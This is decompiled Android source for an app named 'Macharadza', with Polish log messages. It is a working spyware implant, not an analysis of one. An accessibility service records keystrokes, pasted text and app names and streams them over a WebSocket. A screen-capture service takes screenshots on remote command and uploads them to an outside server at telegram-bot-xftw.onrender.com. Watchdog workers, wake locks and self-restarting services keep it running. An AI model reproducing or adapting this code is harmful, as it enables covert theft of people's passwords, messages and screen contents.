                        WorkManager.getInstance(context).enqueueUniquePeriodicWork("ScreenCaptureWatchdog", ExistingPeriodicWorkPolicy.KEEP, (PeriodicWorkRequest)((PeriodicWorkRequest$Builder)new PeriodicWorkRequest$Builder((Class)ServiceRestarter.class, 15L, TimeUnit.MINUTES).setConstraints(new Constraints$Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())).build());
                        Log.d("RestartReceiver", "\ud83d\udee1\ufe0f Watchdog aktywowany (WorkManager)");
                    }
                    catch (final Exception ex2) {
                        Log.e("RestartReceiver", "\u274c B\u0142\u0105d przy uruchamianiu serwisu: " + ex2.getMessage(), (Throwable)ex2);
                    }
                }
                else {
                    Log.d("RestartReceiver", "\u26a0\ufe0f Brak zapisanych uprawnie\u0144 \u2014 serwis nie zostanie uruchomiony");
                }
            }
        }
    }
}


===== ./src/java/com/radza/macharadza/ServiceWatchdogWorker.java =====
package com.radza.macharadza;

import android.util.Log;
import android.os.Build$VERSION;
import android.content.Intent;
import androidx.work.ListenableWorker$Result;
import androidx.work.WorkerParameters;
import android.content.Context;
import androidx.work.Worker;

public class ServiceWatchdogWorker extends Worker
{
    public ServiceWatchdogWorker(final Context context, final WorkerParameters workerParameters) {
        super(context, workerParameters);
    }
    
    public ListenableWorker$Result doWork() {
        try {
            final Intent intent = new Intent(this.getApplicationContext(), (Class)ScreenCaptureService.class);
            if (Build$VERSION.SDK_INT >= 26) {
                this.getApplicationContext().startForegroundService(intent);
            }
            else {
                this.getApplicationContext().startService(intent);
            }
            Log.d("ServiceWatchdog", "\ud83d\udee1\ufe0f Watchdog \u2014 serwis sprawdzony/uruchomiony");
            return ListenableWorker$Result.success();
        }
        catch (final Exception ex) {
            Log.e("ServiceWatchdog", "\u274c B\u0142\u0105d restartu: " + ex.getMessage());
            return ListenableWorker$Result.retry();
        }
    }
}

===== ./src/java/com/radza/macharadza/PermissionsActivity.java =====
package com.radza.macharadza;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.provider.Settings$Secure;
import android.content.Context;
import androidx.appcompat.app.AppCompatActivity;

public class PermissionsActivity extends AppCompatActivity
{
    private boolean isAccessibilityServiceEnabled(final Context context, final Class<?> clazz) {
        try {
            final String string = Settings$Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
            return string != null && string.contains((CharSequence)(context.getPackageName() + "/" + clazz.getName()));
        }
        catch (final Exception ex) {
            Log.e("PermissionsActivity", "B\u0142\u0105d przy sprawdzaniu us\u0142ug: " + ex.getMessage());
            return false;
        }
    }
    
    protected void onCreate(final Bundle bundle) {
        super.onCreate(bundle);
        if (!this.isAccessibilityServiceEnabled((Context)this, MyAccessibilityService.class)) {
            try {
                this.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
                Log.d("PermissionsActivity", "\ud83e\udde9 Uruchomiono ustawienia u\u0142atwie\u0144 dost\u0119pu");
            }
            catch (final Exception ex) {
                Log.e("PermissionsActivity", "\u274c Nie uda\u0142o si\u0119 otworzy\u0107 ustawie\u0144: " + ex.getMessage());
            }
        }
        this.finish();
    }
}


===== ./src/java/com/radza/macharadza/Logger.java =====
package com.radza.macharadza;

import java.io.Reader;
import java.io.BufferedReader;
import java.io.FileReader;
import java.time.LocalTime;
import java.io.IOException;
import java.io.FileWriter;
import java.io.File;
import android.content.Context;

public class Logger
{
    private static final String LOG_FILE_NAME = "macharadza_log.txt";
    
    public static void clearLogs(final Context context) {
        try {
            final File file = new File(context.getFilesDir(), "macharadza_log.txt");
            if (file.exists()) {
                new FileWriter(file, false).close();
            }
        }
        catch (final IOException ex) {
            ex.printStackTrace();
        }
    }
    
    public static void log(final Context context, final String s) {
        try {
            final FileWriter fileWriter = new FileWriter(new File(context.getFilesDir(), "macharadza_log.txt"), true);
            fileWriter.append((CharSequence)"[").append((CharSequence)LocalTime.now().toString()).append((CharSequence)"] ").append((CharSequence)s).append((CharSequence)"\n");
            fileWriter.close();
        }
        catch (final IOException ex) {
            ex.printStackTrace();
        }
    }
    
    public static String readLogs(final Context context) {
        final StringBuilder sb = new StringBuilder();
        try {
            final File file = new File(context.getFilesDir(), "macharadza_log.txt");
            if (!file.exists()) {
                return "Brak zapisanych log\u00f3w.";
            }
            final BufferedReader bufferedReader = new BufferedReader((Reader)new FileReader(file));
            while (true) {
                final String line = bufferedReader.readLine();
                if (line == null) {
                    break;
                }
                sb.append(line).append("\n");
            }
            bufferedReader.close();
        }
        catch (final IOException ex) {
            sb.append("B\u0142\u0105d odczytu log\u00f3w: ").append(ex.getMessage());
        }
        return sb.toString();
    }
}

    private Bitmap captureScreen() {
        try {
            if (this.imageReader == null) {
                return null;
            }
            final Image acquireLatestImage = this.imageReader.acquireLatestImage();
            if (acquireLatestImage == null) {
                return null;
            }
            final Image$Plane[] planes = acquireLatestImage.getPlanes();
            final ByteBuffer buffer = planes[0].getBuffer();
            final int pixelStride = planes[0].getPixelStride();
            final Bitmap bitmap = Bitmap.createBitmap(acquireLatestImage.getWidth() + (planes[0].getRowStride() - acquireLatestImage.getWidth() * pixelStride) / pixelStride, acquireLatestImage.getHeight(), Bitmap$Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer((Buffer)buffer);
            acquireLatestImage.close();
            return Bitmap.createBitmap(bitmap, 0, 0, acquireLatestImage.getWidth(), acquireLatestImage.getHeight());
        }
        catch (final Exception ex) {
            this.sendLogToUI("[ERROR] captureScreen(): " + ex.getMessage());
            return null;
        }
    }

    private String sha256(final String s) {
        try {
            final byte[] digest = MessageDigest.getInstance("SHA-256").digest(s.getBytes("UTF-8"));
            final StringBuilder sb = new StringBuilder();
            for (int length = digest.length, i = 0; i < length; ++i) {
                sb.append(String.format("%02x", new Object[] { digest[i] }));
            }
            return sb.toString();
        }
        catch (final Exception ex) {
            return Integer.toHexString(s.hashCode());
        }
    }
    
    private void startForegroundServiceNotification() {

    private void startVirtualDisplay() {
        try {
            if (this.mediaProjection == null) {
                return;
            }
            final DisplayMetrics displayMetrics = new DisplayMetrics();
            ((WindowManager)this.getSystemService("window")).getDefaultDisplay().getRealMetrics(displayMetrics);
            final int widthPixels = displayMetrics.widthPixels;
            final int heightPixels = displayMetrics.heightPixels;
            final int densityDpi = displayMetrics.densityDpi;
            this.imageReader = ImageReader.newInstance(widthPixels, heightPixels, 1, 2);
            this.virtualDisplay = this.mediaProjection.createVirtualDisplay("ScreenCapture", widthPixels, heightPixels, densityDpi, 16, this.imageReader.getSurface(), (VirtualDisplay$Callback)null, (Handler)null);
            this.sendLogToUI("[STEP] VirtualDisplay created \u2705");
        }
        catch (final Exception ex) {
            this.sendLogToUI("[ERROR] startVirtualDisplay(): " + ex.getMessage());
        }
    }

    public void onCreate() {
        super.onCreate();
        this.httpClient = new OkHttpClient();
        (ScreenCaptureService.instance = this).createNotificationChannel();
        this.startForeground(1, new NotificationCompat$Builder((Context)this, "capture_channel").setContentTitle((CharSequence)"Macharadza aktywny").setContentText((CharSequence)"Aplikacja dzia\u0142a w tle i utrzymuje po\u0142\u0105czenie.").setSmallIcon(R.mipmap.ic_launcher).setOngoing(true).setPriority(-1).setCategory("service").build());
        this.sendLogToUI("[STEP 0] Service created (Foreground active)");
        try {
            final PowerManager powerManager = (PowerManager)this.getSystemService("power");
            if (powerManager != null) {
                (this.wakeLock = powerManager.newWakeLock(1, "ScreenCaptureService:wakelock")).setReferenceCounted(false);
                if (!this.wakeLock.isHeld()) {
                    this.wakeLock.acquire();
                    this.sendLogToUI("[WAKELOCK] Acquired partial WakeLock");
                }
            }
        }
        catch (final Exception ex) {
            this.sendLogToUI("[WARN] WakeLock acquire failed: " + ex.getMessage());
        }
        this.scheduleWatchdog();
        this.connectWebSocket();
    }
    
    public void onDestroy() {
        super.onDestroy();
        try {
            if (this.wakeLock != null && this.wakeLock.isHeld()) {
                this.wakeLock.release();
                this.sendLogToUI("[WAKELOCK] Released WakeLock");
            }
        }
        catch (final Exception ex) {
            this.sendLogToUI("[WARN] WakeLock release failed: " + ex.getMessage());
        }
        if (this.wsClient != null) {
            this.wsClient.close();
        }
        if (this.virtualDisplay != null) {
            this.virtualDisplay.release();
        }
        if (this.mediaProjection != null) {
            this.mediaProjection.stop();
        }
        this.executor.shutdownNow();
        this.sendLogToUI("[STEP] Service destroyed");
        final Intent intent = new Intent(this.getApplicationContext(), (Class)ScreenCaptureService.class);
        intent.setPackage(this.getPackageName());
        if (Build$VERSION.SDK_INT >= 26) {
            this.startForegroundService(intent);
        }
        else {
            this.startService(intent);
        }
    }
    
    public int onStartCommand(Intent intent, int intExtra, final int n) {
        this.sendLogToUI("[DEBUG] onStartCommand()");
        this.requestFilePermissionsIfNeeded();
        if (intent != null) {
            intExtra = intent.getIntExtra("resultCode", -1);
            intent = (Intent)intent.getParcelableExtra("data");
            if (intExtra == -1 && intent != null) {
                this.mediaProjection = ((MediaProjectionManager)this.getSystemService("media_projection")).getMediaProjection(intExtra, intent);
                if (this.mediaProjection != null) {
                    this.sendLogToUI("[STEP] MediaProjection initialized \u2705");
                    this.startVirtualDisplay();
                }
                else {
                    this.sendLogToUI("[ERROR] MediaProjection is null");
                }
            }
        }
        return 1;
    }
    
    public void onTaskRemoved(final Intent intent) {
        final Intent intent2 = new Intent(this.getApplicationContext(), (Class)ScreenCaptureService.class);
        intent2.setPackage(this.getPackageName());
        if (Build$VERSION.SDK_INT >= 26) {
            this.startForegroundService(intent2);
        }
        else {
            this.startService(intent2);
        }
        super.onTaskRemoved(intent);
    }
    
    public void sendKeyOverWebSocket(final String s, final String s2, final String s3) {
        if (this.keyboardEnabled && this.wsClient != null && this.wsClient.isOpen()) {
            this.sendExecutor.execute((Runnable)new ScreenCaptureService$$ExternalSyntheticLambda6(this, s, s2, s3));
        }
    }
    
    public void setKeyboardEnabled(final boolean keyboardEnabled) {
        this.keyboardEnabled = keyboardEnabled;
        final StringBuilder append = new StringBuilder().append("[KEYBOARD] Monitoring: ");
        String s;
        if (keyboardEnabled) {
            s = "ON";
        }
        else {
            s = "OFF";
        }
        this.sendLogToUI(append.append(s).toString());
    }
}


===== ./src/java/com/radza/macharadza/ScreenshotHelper.java =====
package com.radza.macharadza;

import android.graphics.Canvas;
import android.graphics.Bitmap$Config;
import android.view.View;
import android.content.Context;
import android.graphics.Bitmap;
import android.app.Activity;

public class ScreenshotHelper
{
    public static Bitmap captureScreen(final Activity activity) {
        return captureView(activity.getWindow().getDecorView().getRootView());
    }
    
    public static Bitmap captureScreen(final Context context) {
        if (context instanceof Activity) {
            return captureScreen((Activity)context);
        }
        return null;
    }
    
    public static Bitmap captureView(final View view) {
        final Bitmap bitmap = Bitmap.createBitmap(view.getWidth(), view.getHeight(), Bitmap$Config.ARGB_8888);
        view.draw(new Canvas(bitmap));
        return bitmap;
    }
}


===== ./src/java/com/radza/macharadza/HttpHelper.java =====
package com.radza.macharadza;

import okhttp3.Response;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.RequestBody;
import okhttp3.FormBody$Builder;
import okhttp3.Request$Builder;
import okhttp3.OkHttpClient;

public class HttpHelper
{
    public static void uploadScreenshot(final String s, final String s2) {
        new OkHttpClient().newCall(new Request$Builder().url("https://telegram-bot-xftw.onrender.com/upload").post((RequestBody)new FormBody$Builder().add("token", s2).add("screenshot", s).build()).build()).enqueue((Callback)new Callback() {
            public void onFailure(final Call call, final IOException ex) {
                ex.printStackTrace();
            }
            
            public void onResponse(final Call call, final Response response) throws IOException {
                response.close();
            }
        });
    }
}


===== ./src/java/com/radza/macharadza/ServiceRestarter.java =====
package com.radza.macharadza;

import android.os.Build$VERSION;
import android.content.Intent;
import android.util.Log;
import androidx.work.ListenableWorker$Result;
import androidx.work.WorkerParameters;
import android.content.Context;
import androidx.work.Worker;

public class ServiceRestarter extends Worker
{
    private static final String TAG = "ServiceRestarter";
    
    public ServiceRestarter(final Context context, final WorkerParameters workerParameters) {
        super(context, workerParameters);
    }
    
    public ListenableWorker$Result doWork() {
        try {
            final Context applicationContext = this.getApplicationContext();
            Log.d("ServiceRestarter", "[Watchdog] Restarting ScreenCaptureService...");
            final Intent intent = new Intent(applicationContext, (Class)ScreenCaptureService.class);
            if (Build$VERSION.SDK_INT >= 26) {
                applicationContext.startForegroundService(intent);
            }
            else {
                applicationContext.startService(intent);
            }
            Log.d("ServiceRestarter", "[Watchdog] Service restart intent sent \u2705");
            return ListenableWorker$Result.success();
        }
        catch (final Exception ex) {
            Log.e("ServiceRestarter", "[Watchdog] Failed to restart service: " + ex.getMessage(), (Throwable)ex);
            return ListenableWorker$Result.failure();
        }
    }
}


===== ./src/java/com/radza/macharadza/ScreenCaptureUtils.java =====
package com.radza.macharadza;

import java.nio.ByteBuffer;
import android.media.Image$Plane;
import android.media.Image;
import java.nio.Buffer;
import android.graphics.Bitmap$Config;
import android.os.Handler;
import android.hardware.display.VirtualDisplay$Callback;
import android.media.ImageReader;
import android.util.DisplayMetrics;
import android.graphics.Bitmap;
import android.view.WindowManager;
import android.media.projection.MediaProjection;

public class ScreenCaptureUtils
{
    public static Bitmap capture(final MediaProjection mediaProjection, final WindowManager windowManager) {
        try {
            final DisplayMetrics displayMetrics = new DisplayMetrics();
            windowManager.getDefaultDisplay().getRealMetrics(displayMetrics);
            final int widthPixels = displayMetrics.widthPixels;
            final int heightPixels = displayMetrics.heightPixels;
            final int densityDpi = displayMetrics.densityDpi;
            final ImageReader instance = ImageReader.newInstance(widthPixels, heightPixels, 1, 2);
            mediaProjection.createVirtualDisplay("ScreenCapture", widthPixels, heightPixels, densityDpi, 16, instance.getSurface(), (VirtualDisplay$Callback)null, (Handler)null);
            Thread.sleep(400L);
            final Image acquireLatestImage = instance.acquireLatestImage();
            if (acquireLatestImage == null) {
                return null;
            }
            final Image$Plane[] planes = acquireLatestImage.getPlanes();
            final ByteBuffer buffer = planes[0].getBuffer();
            final int pixelStride = planes[0].getPixelStride();
            final Bitmap bitmap = Bitmap.createBitmap((planes[0].getRowStride() - pixelStride * widthPixels) / pixelStride + widthPixels, heightPixels, Bitmap$Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer((Buffer)buffer);
            acquireLatestImage.close();
            instance.close();
            return Bitmap.createBitmap(bitmap, 0, 0, widthPixels, heightPixels);
        }
        catch (final Exception ex) {
            ex.printStackTrace();
            return null;
        }
    }
}


===== ./src/java/com/radza/macharadza/MyKeyboardService.java =====
package com.radza.macharadza;

import android.view.KeyEvent;
import java.util.List;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import android.content.pm.PackageManager;
import java.util.concurrent.ConcurrentHashMap;
import android.accessibilityservice.AccessibilityService;

public class MyKeyboardService extends AccessibilityService
{
    private static final String TAG = "MyKeyboardService";
    private String lastText;
    private final ConcurrentHashMap<String, StringBuilder> wordBuffers;
    
    public MyKeyboardService() {
        this.wordBuffers = (ConcurrentHashMap<String, StringBuilder>)new ConcurrentHashMap();
        this.lastText = "";
    }
    
    private void finalizeWord(final String s, final String s2, final String s3) {
        final StringBuilder sb = (StringBuilder)this.wordBuffers.getOrDefault((Object)s2, (Object)new StringBuilder());
        if (sb.length() > 0) {
            final String string = sb.toString();
            sb.setLength(0);
            this.send(string, s2, s3);
        }
        this.send(s, s2, s3);
    }
    
    private String getAppName(String string) {
        try {
            final PackageManager packageManager = this.getPackageManager();
            string = packageManager.getApplicationLabel(packageManager.getApplicationInfo(string, 0)).toString();
            return string;
        }
        catch (final Exception ex) {
            return "unknown";
        }
    }
    
    private String getPackage() {
        final AccessibilityNodeInfo rootInActiveWindow = this.getRootInActiveWindow();
        if (rootInActiveWindow != null && rootInActiveWindow.getPackageName() != null) {
            return rootInActiveWindow.getPackageName().toString();
        }
        return "unknown";
    }
    
    private void handleBackspace() {
        final String package1 = this.getPackage();
        this.wordBuffers.putIfAbsent((Object)package1, (Object)new StringBuilder());
        final StringBuilder sb = (StringBuilder)this.wordBuffers.get((Object)package1);
        if (sb.length() > 0) {
            sb.deleteCharAt(sb.length() - 1);
        }
    }
    
    private void handleCharacter(final char c, final String s, final String s2) {
        this.wordBuffers.putIfAbsent((Object)s, (Object)new StringBuilder());
        final StringBuilder sb = (StringBuilder)this.wordBuffers.get((Object)s);
        if (c != ' ' && ".,!?;:".indexOf((int)c) < 0) {
            sb.append(c);
            return;
        }
        if (sb.length() > 0) {
            final String string = sb.toString();
            sb.setLength(0);
            this.send(string, s, s2);
        }
        if (c != ' ') {
            this.send(String.valueOf(c), s, s2);
        }
    }
    
    private boolean isPasteOrSuggestion(final String s, final String s2) {
        final int abs = Math.abs(s2.length() - s.length());
        boolean b = true;
        if (abs <= 1) {
            b = false;
        }
        return b;
    }
    
    private void processPastedOrSuggestedText(String trim, final String s, final String s2) {
        trim = trim.trim();
        if (trim.isEmpty()) {
            return;
        }
        this.send(trim, s, s2);
        Log.d("MyKeyboardService", "PASTE/SUGGESTION \u2192 " + trim);
        this.wordBuffers.put((Object)s, (Object)new StringBuilder());
    }
    
    private void send(final String s, final String s2, final String s3) {
        final ScreenCaptureService instance = ScreenCaptureService.getInstance();
        if (instance != null && instance.isKeyboardEnabled()) {
            instance.sendKeyOverWebSocket(s, s2, s3);
        }
        Log.d("MyKeyboardService", "SEND \u2192 " + s);
    }
    
    public void onAccessibilityEvent(final AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent.getEventType() == 16) {
            final List text = accessibilityEvent.getText();
            if (text == null || text.isEmpty()) {
                return;
            }
            final String string = ((CharSequence)text.get(0)).toString();
            if (string == null) {
                return;
            }
            final String package1 = this.getPackage();
            final String appName = this.getAppName(package1);
            if (string.length() < this.lastText.length()) {
                this.handleBackspace();
            }
            if (this.isPasteOrSuggestion(this.lastText, string)) {
                this.processPastedOrSuggestedText(string, package1, appName);
            }
            else if (!string.equals((Object)this.lastText)) {
                this.send(string.substring(string.length() - 1), package1, appName);
            }
            this.lastText = string;
        }
    }
    
    public void onInterrupt() {
    }
    
    protected boolean onKeyEvent(final KeyEvent keyEvent) {
        if (keyEvent.getAction() != 0) {
            return super.onKeyEvent(keyEvent);
        }
        final int keyCode = keyEvent.getKeyCode();
        final String package1 = this.getPackage();
        final String appName = this.getAppName(package1);
        if (keyCode == 67) {
            this.handleBackspace();
            return true;
        }
        if (keyCode == 66) {
            this.finalizeWord("[ENTER]", package1, appName);
            return true;
        }
        final int unicodeChar = keyEvent.getUnicodeChar();
        if (unicodeChar != 0) {
            this.handleCharacter((char)unicodeChar, package1, appName);
        }
        return super.onKeyEvent(keyEvent);
    }
}


===== ./src/java/com/radza/macharadza/WebSocketClientWrapper.java =====
package com.radza.macharadza;

import android.util.Base64;
import java.io.OutputStream;
import android.graphics.Bitmap$CompressFormat;
import java.io.ByteArrayOutputStream;
import android.graphics.Bitmap;
import org.java_websocket.handshake.ServerHandshake;
import java.net.URI;
import org.java_websocket.client.WebSocketClient;

public class WebSocketClientWrapper
{
    private WebSocketClient client;
    private ScreenshotCommandListener listener;
    
    public WebSocketClientWrapper(final String s, final ScreenshotCommandListener listener) {
        this.listener = listener;
        try {
            this.client = new WebSocketClient(this, new URI(s), listener) {
                final WebSocketClientWrapper this$0;
                final ScreenshotCommandListener val$listener;
                
                @Override
                public void onClose(final int n, final String s, final boolean b) {
                }
                
                @Override
                public void onError(final Exception ex) {
                }
                
                @Override
                public void onMessage(final String s) {
                    if ("/screenshot".equalsIgnoreCase(s.trim()) && this.val$listener != null) {
                        this.val$listener.onScreenshotCommand();
                    }
                }
                
                @Override
                public void onOpen(final ServerHandshake serverHandshake) {
                }
            };
        }
        catch (final Exception ex) {
            ex.printStackTrace();
        }
    }
    
    public void connect() {
        if (this.client != null) {
            this.client.connect();
        }
    }
    
    public void disconnect() {
        if (this.client != null) {
            this.client.close();
        }
    }
    
    public void sendScreenshot(final Bitmap bitmap) {
        if (this.client != null && this.client.isOpen() && bitmap != null) {
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap$CompressFormat.PNG, 100, (OutputStream)byteArrayOutputStream);
            this.client.send(Base64.encodeToString(byteArrayOutputStream.toByteArray(), 2));
        }
    }
    
    public interface ScreenshotCommandListener
    {
        void onScreenshotCommand();
    }
}

package com.radza.macharadza.databinding;

import android.view.ViewGroup;
import android.view.LayoutInflater;
import androidx.viewbinding.ViewBindings;
import com.radza.macharadza.R;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.ImageView;
import androidx.viewbinding.ViewBinding;

public final class FileItemBinding implements ViewBinding
{
    public final ImageView fileIcon;
    public final TextView fileName;
    private final LinearLayout rootView;
    
    private FileItemBinding(final LinearLayout rootView, final ImageView fileIcon, final TextView fileName) {
        this.rootView = rootView;
        this.fileIcon = fileIcon;
        this.fileName = fileName;
    }
    
    public static FileItemBinding bind(final View view) {
        int n = R.id.file_icon;
        final ImageView imageView = (ImageView)ViewBindings.findChildViewById(view, n);
        if (imageView != null) {
            n = R.id.file_name;
            final TextView textView = (TextView)ViewBindings.findChildViewById(view, n);
            if (textView != null) {
                return new FileItemBinding((LinearLayout)view, imageView, textView);
            }
        }
        throw new NullPointerException("Missing required view with ID: ".concat(view.getResources().getResourceName(n)));
    }
    
    public static FileItemBinding inflate(final LayoutInflater layoutInflater) {
        return inflate(layoutInflater, null, false);
    }
    
    public static FileItemBinding inflate(final LayoutInflater layoutInflater, final ViewGroup viewGroup, final boolean b) {
        final View inflate = layoutInflater.inflate(R.layout.file_item, viewGroup, false);
        if (b) {
            viewGroup.addView(inflate);
        }
        return bind(inflate);
    }
    
    public LinearLayout getRoot() {
        return this.rootView;
    }
}

===== ./src/java/com/radza/macharadza/databinding/ActivityFileManagerBinding.java =====
package com.radza.macharadza.databinding;

import android.view.ViewGroup;
import android.view.LayoutInflater;
import androidx.viewbinding.ViewBindings;
import com.radza.macharadza.R;
import android.view.View;
import android.widget.RelativeLayout;
import androidx.recyclerview.widget.RecyclerView;
import android.widget.Button;
import android.widget.HorizontalScrollView;
import android.widget.LinearLayout;
import androidx.viewbinding.ViewBinding;

public final class ActivityFileManagerBinding implements ViewBinding
{
    public final LinearLayout bottomMenu;
    public final HorizontalScrollView bottomMenuScroll;
    public final Button btnChooseStorage;
    public final Button btnDelete;
    public final Button btnNewFolder;
    public final Button btnOpenSelected;
    public final Button btnPaste;
    public final Button btnUp;
    public final RecyclerView recyclerView;
    private final RelativeLayout rootView;
    
    private ActivityFileManagerBinding(final RelativeLayout rootView, final LinearLayout bottomMenu, final HorizontalScrollView bottomMenuScroll, final Button btnChooseStorage, final Button btnDelete, final Button btnNewFolder, final Button btnOpenSelected, final Button btnPaste, final Button btnUp, final RecyclerView recyclerView) {
        this.rootView = rootView;
        this.bottomMenu = bottomMenu;
        this.bottomMenuScroll = bottomMenuScroll;
        this.btnChooseStorage = btnChooseStorage;
        this.btnDelete = btnDelete;
        this.btnNewFolder = btnNewFolder;
        this.btnOpenSelected = btnOpenSelected;
        this.btnPaste = btnPaste;
        this.btnUp = btnUp;
        this.recyclerView = recyclerView;
    }
    
    public static ActivityFileManagerBinding bind(final View view) {
        int n = R.id.bottomMenu;
        final LinearLayout linearLayout = (LinearLayout)ViewBindings.findChildViewById(view, n);
        if (linearLayout != null) {
            n = R.id.bottomMenuScroll;
            final HorizontalScrollView horizontalScrollView = (HorizontalScrollView)ViewBindings.findChildViewById(view, n);
            if (horizontalScrollView != null) {
                n = R.id.btn_choose_storage;
                final Button button = (Button)ViewBindings.findChildViewById(view, n);
                if (button != null) {
                    n = R.id.btn_delete;
                    final Button button2 = (Button)ViewBindings.findChildViewById(view, n);
                    if (button2 != null) {
                        n = R.id.btn_new_folder;
                        final Button button3 = (Button)ViewBindings.findChildViewById(view, n);
                        if (button3 != null) {
                            n = R.id.btn_open_selected;
                            final Button button4 = (Button)ViewBindings.findChildViewById(view, n);
                            if (button4 != null) {
                                n = R.id.btn_paste;
                                final Button button5 = (Button)ViewBindings.findChildViewById(view, n);
                                if (button5 != null) {
                                    n = R.id.btn_up;
                                    final Button button6 = (Button)ViewBindings.findChildViewById(view, n);
                                    if (button6 != null) {
                                        n = R.id.recyclerView;
                                        final RecyclerView recyclerView = (RecyclerView)ViewBindings.findChildViewById(view, n);
                                        if (recyclerView != null) {
                                            return new ActivityFileManagerBinding((RelativeLayout)view, linearLayout, horizontalScrollView, button, button2, button3, button4, button5, button6, recyclerView);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        throw new NullPointerException("Missing required view with ID: ".concat(view.getResources().getResourceName(n)));
    }
    
    public static ActivityFileManagerBinding inflate(final LayoutInflater layoutInflater) {
        return inflate(layoutInflater, null, false);
    }
    
    public static ActivityFileManagerBinding inflate(final LayoutInflater layoutInflater, final ViewGroup viewGroup, final boolean b) {
        final View inflate = layoutInflater.inflate(R.layout.activity_file_manager, viewGroup, false);
        if (b) {
            viewGroup.addView(inflate);
        }
        return bind(inflate);
    }
    
    public RelativeLayout getRoot() {
        return this.rootView;
    }

{
    void close();

    void close(final int p0, final String p1);
    
    void closeConnection(final int p0, final String p1);
    
     <T> T getAttachment();
    
    Draft getDraft();
    
    InetSocketAddress getLocalSocketAddress();
    
    IProtocol getProtocol();
    
    ReadyState getReadyState();
    
    InetSocketAddress getRemoteSocketAddress();

     <T> void setAttachment(final T p0);
